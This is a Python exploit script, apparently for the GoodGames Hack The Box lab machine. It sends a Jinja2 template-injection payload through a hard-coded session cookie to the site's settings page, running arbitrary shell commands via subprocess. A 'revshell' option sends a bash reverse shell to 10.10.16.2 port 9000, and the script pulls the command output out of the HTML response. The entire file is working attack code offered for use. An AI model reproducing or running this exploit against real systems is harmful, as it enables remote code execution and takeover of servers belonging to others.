#!/usr/bin/env python3

import requests, html, sys

if len(sys.argv) != 2:
	print(f"Usage: {sys.argv[0]} [cmd]\nTo get reverse shell to port 9000 type 'revshell' and start nc listener")
	sys.exit(1)

if sys.argv[1] == "revshell":
	cmd = 'bash -c "bash -i >& /dev/tcp/10.10.16.2/9000 0>&1"'
else:
	cmd = sys.argv[1]

url = "http://internal-administration.goodgames.htb"
path = "/settings"
header = {"Accept-Encoding": "gzip, deflate"}
payload = f"''.__class__.__mro__[1].__subclasses__()[217]('{cmd}', shell=True, stdout=-1).stdout.read().decode('utf-8')"
data = {
	"name":f'{{{{ {payload} }}}}'
}
cookie = {"session":".eJwljktqAzEQBe-itRfq1ue1fJlB6g8JhgRm7JXx3SPI6lFvUdQ7HXH69ZXuz_Plt3R8W7on6SpUqJeOwuRddLJjma1qBhmcaRRAEF33gkbQyBpaamOlWcdCBWlfqlxg7otNao6aB9oawkxqcNSGzDEE1by5QnTNJkg75HX5-V9DG_U643j-PvxnH71KbrK2FBLeFda2jYJ8MucFFccOnunzB0w4PvM.Y2uLRw.khxyCdh8crYANstUeFSQGDeSYmY"}

print("[+] Sending payload...")
s = requests.Session()
try:
	r = s.post(url+path, data=data, cookies=cookie, headers=header)
except:
	print("[-] Error communicating with the server.")
	print("[-] Exiting...")
	sys.exit(1)

print("[+] Payload Sent!")
print("[+] Parsing response...")

try:
	juice = r.text
	hella_juice = juice[juice.index('<h4 class="h3">') + len('<h4 class="h3">                                 ') :juice.index('<h5 class="fw-normal">') - len('<h5 class="fw-normal">			    </h4>')]
	final_juice = html.unescape(hella_juice.strip())
except:
	print("[-] Error occured while parsing the response!")
	print("[-] Exiting...")
	sys.exit(1)


print(f"[+] Result: {final_juice}")